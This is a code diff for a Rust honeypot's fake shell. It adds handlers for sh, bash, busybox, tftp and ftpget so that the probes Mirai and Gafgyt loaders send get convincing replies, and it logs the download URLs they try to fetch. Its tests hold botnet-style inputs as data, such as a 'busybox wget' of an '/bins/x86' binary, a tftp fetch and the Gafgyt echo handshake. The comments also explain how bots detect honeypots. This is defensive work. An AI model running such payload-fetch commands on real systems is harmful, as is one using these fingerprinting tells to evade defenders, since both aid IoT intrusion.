@@ -123,27 +123,25 @@ impl FakeShell {
 
         let mut events = vec![event];
 
-        if matches!(parts.first().copied(), Some("wget") | Some("curl")) {
-            let url = first_non_flag_arg(&parts[1..]).unwrap_or("");
-            if !url.is_empty() {
-                let sanitized_url = sanitize_value(url, MAX_URL_LEN);
-                events.push(SensorEvent {
-                    v: WIRE_VERSION,
-                    source_ip: self.ctx.source_ip,
-                    wan_ip: self.ctx.wan_ip,
-                    sensor: self.ctx.protocol_label.clone(),
-                    signal_type: SIGNAL_HONEYPOT_FILE_DOWNLOAD.into(),
-                    protocol: PROTO_TCP.into(),
-                    authenticated: self.ctx.authenticated,
-                    observed_at: chrono::Utc::now(),
-                    metadata: serde_json::json!({
-                        "protocol_label": self.ctx.protocol_label,
-                        "url": sanitized_url,
-                    }),
-                    sample: None,
-                    session_id: self.ctx.session_id,
-                });
-            }
+        // `download_target` only returns a real (non-empty) token, so no empty-check is needed.
+        if let Some(url) = download_target(&parts) {
+            let sanitized_url = sanitize_value(url, MAX_URL_LEN);
+            events.push(SensorEvent {
+                v: WIRE_VERSION,
+                source_ip: self.ctx.source_ip,
+                wan_ip: self.ctx.wan_ip,
+                sensor: self.ctx.protocol_label.clone(),
+                signal_type: SIGNAL_HONEYPOT_FILE_DOWNLOAD.into(),
+                protocol: PROTO_TCP.into(),
+                authenticated: self.ctx.authenticated,
+                observed_at: chrono::Utc::now(),
+                metadata: serde_json::json!({
+                    "protocol_label": self.ctx.protocol_label,
+                    "url": sanitized_url,
+                }),
+                sample: None,
+                session_id: self.ctx.session_id,
+            });
         }
 
         (output, events)
@@ -163,6 +161,17 @@ impl FakeShell {
             Some("ls") => self.cmd_ls(parts),
             Some("wget") => cmd_wget(parts),
             Some("curl") => cmd_curl(),
+            // Shell-availability fingerprint: every real system has /bin/sh, so "command not found"
+            // for sh/bash instantly outs the honeypot and the dropper leaves. Model a nested shell.
+            Some("sh") | Some("bash") => self.cmd_shell_spawn(parts),
+            // The canonical Mirai/Gafgyt probe is `/bin/busybox <TOKEN>`, which they confirm by the
+            // exact "<TOKEN>: applet not found" reply; they also fetch payloads via `busybox wget`
+            // and `busybox tftp`.
+            Some("busybox") => self.cmd_busybox(parts),
+            // tftp/ftpget are BusyBox download applets these loaders use; stay quiet (a real
+            // non-interactive fetch prints nothing on success) rather than "command not found". The
+            // target URL is captured by `download_target` above.
+            Some("tftp") | Some("ftpget") => String::new(),
             Some("cd") => {
                 self.cwd = first_non_flag_arg(&parts[1..])
                     .unwrap_or("/root")
@@ -193,6 +202,83 @@ impl FakeShell {
             None => format!("ls: cannot access '{target}': No such file or directory\n"),
         }
     }
+
+    /// `sh` / `bash`. A nested interactive shell just drops the caller at a new prompt, so a bare
+    /// invocation is a no-op that keeps the session in this fake shell (never "command not found").
+    /// `sh -c "CMD"` runs CMD in the fake shell, since loaders stage their payload that way.
+    fn cmd_shell_spawn(&mut self, parts: &[&str]) -> String {
+        let script = parts
+            .iter()
+            .position(|&p| p == "-c")
+            .and_then(|pos| parts.get(pos + 1));
+        if let Some(script) = script {
+            let inner = strip_one_quote_pair(script);
+            let inner_parts: Vec<&str> = inner.split_whitespace().collect();
+            if !inner_parts.is_empty() {
+                return self.dispatch(&inner_parts);
+            }
+        }
+        String::new()
+    }
+
+    /// `busybox`. Bare invocation prints the multi-call banner. `busybox <applet> ...` runs the
+    /// applet if it is one this shell models, else returns BusyBox's exact "<applet>: applet not
+    /// found" - the reply Mirai/Gafgyt check for to confirm a real busybox before delivering.
+    fn cmd_busybox(&mut self, parts: &[&str]) -> String {
+        match parts.get(1).copied() {
+            None => busybox_banner(),
+            Some(applet) if is_busybox_applet(applet) => self.dispatch(&parts[1..]),
+            Some(applet) => format!("{applet}: applet not found\n"),
+        }
+    }
+}
+
+/// The download target of a fetch command, or `None` if the line is not one. Covers the direct
+/// fetchers and the BusyBox forms (`busybox wget URL`, `busybox tftp ...`) IoT loaders favour, so
+/// the `honeypot_file_download` event fires for those too - not only a bare `wget`/`curl`.
+fn download_target<'a>(parts: &[&'a str]) -> Option<&'a str> {
+    const FETCHERS: [&str; 4] = ["wget", "curl", "tftp", "ftpget"];
+    match parts.first().copied() {
+        Some(cmd) if FETCHERS.contains(&cmd) => first_non_flag_arg(&parts[1..]),
+        Some("busybox") if parts.get(1).is_some_and(|a| FETCHERS.contains(a)) => {
+            first_non_flag_arg(&parts[2..])
+        }
+        _ => None,
+    }
+}
+
+/// BusyBox applets this shell models, so `busybox <applet>` delegates to the same handler the bare
+/// command uses. Anything outside this set returns "applet not found" (the Mirai/Gafgyt tell).
+fn is_busybox_applet(name: &str) -> bool {
+    matches!(
+        name,
+        "echo"
+            | "cat"
+            | "ls"
+            | "wget"
+            | "id"
+            | "whoami"
+            | "uname"
+            | "pwd"
+            | "cd"
+            | "sh"
+            | "tftp"
+            | "ftpget"
+    )
+}
+
+/// The BusyBox multi-call banner printed by a bare `busybox`. Abbreviated applet list; loaders key
+/// off the "applet not found" reply, not this text.
+fn busybox_banner() -> String {
+    "BusyBox v1.31.1 (2021-06-01 00:00:00 UTC) multi-call binary.\n\
+     BusyBox is copyrighted by many authors between 1998-2015.\n\
+     \n\
+     Usage: busybox [function [arguments]...]\n\
+     \n\
+     Currently defined functions:\n\
+     \tash, base64, cat, chmod, cp, echo, ftpget, id, ls, mkdir, ping, pwd, rm, sh, sleep,\n\
+     \ttftp, uname, wget, whoami\n"
+        .to_string()
 }
 
 fn cmd_uname(parts: &[&str]) -> String {
@@ -437,5 +523,82 @@ mod echo_tests {
     #[test]
     fn bare_echo_prints_only_a_newline() {
         assert_eq!(cmd_echo(&[]), "\n");
+    }
+}
+
+#[cfg(test)]
+mod shell_detection_tests {
+    use super::{
+        EmitContext, FakeShell, SIGNAL_HONEYPOT_FILE_DOWNLOAD, download_target, is_busybox_applet,
+    };
+    use crate::fakefs::FakeFs;
+
+    fn shell() -> FakeShell {
+        FakeShell::new(
+            FakeFs::new(),
+            EmitContext {
+                source_ip: "203.0.113.7".parse().unwrap(),
+                wan_ip: None,
+                authenticated: true,
+                protocol_label: "telnet".to_string(),
+                session_id: None,
+            },
+        )
+    }
+
+    #[test]
+    fn sh_is_never_command_not_found() {
+        // Every real system has /bin/sh; "command not found" would out the honeypot instantly.
+        let (out, events) = shell().handle_input("sh");
+        assert_eq!(out, "");
+        assert_eq!(events.len(), 1); // command_exec only, no spurious download
+    }
+
+    #[test]
+    fn mirai_busybox_probe_returns_applet_not_found() {
+        // `/bin/busybox <TOKEN>` is Mirai/Gafgyt's real-shell check; they require the exact
+        // "<TOKEN>: applet not found" reply before delivering a payload.
+        let (out, _) = shell().handle_input("busybox MIRAI");
+        assert_eq!(out, "MIRAI: applet not found\n");
+    }
+
+    #[test]
+    fn busybox_echo_still_passes_the_gafgyt_handshake() {
+        let (out, _) = shell().handle_input("busybox echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"");
+        assert_eq!(out, "GAYFGT\n");
+    }
+
+    #[test]
+    fn sh_dash_c_runs_the_inner_command() {
+        let (out, _) = shell().handle_input("sh -c \"id\"");
+        assert!(out.contains("uid=0(root)"), "got: {out}");
+    }
+
+    #[test]
+    fn busybox_wget_is_captured_as_a_download() {
+        let (_, events) = shell().handle_input("busybox wget http://198.51.100.9/bins/x86");
+        let dl = events
+            .iter()
+            .find(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
+            .expect("busybox wget must emit a file_download event");
+        assert_eq!(dl.metadata["url"], "http://198.51.100.9/bins/x86");
+    }
+
+    #[test]
+    fn download_target_recognizes_direct_and_busybox_forms() {
+        assert_eq!(download_target(&["wget", "http://x/y"]), Some("http://x/y"));
+        assert_eq!(
+            download_target(&["busybox", "tftp", "-g", "-r", "x", "10.0.0.1"]),
+            Some("x")
+        );
+        assert_eq!(download_target(&["busybox", "MIRAI"]), None);
+        assert_eq!(download_target(&["ls", "-la"]), None);
+    }
+
+    #[test]
+    fn busybox_applet_set() {
+        assert!(is_busybox_applet("wget"));
+        assert!(is_busybox_applet("sh"));
+        assert!(!is_busybox_applet("MIRAI"));
     }
 }
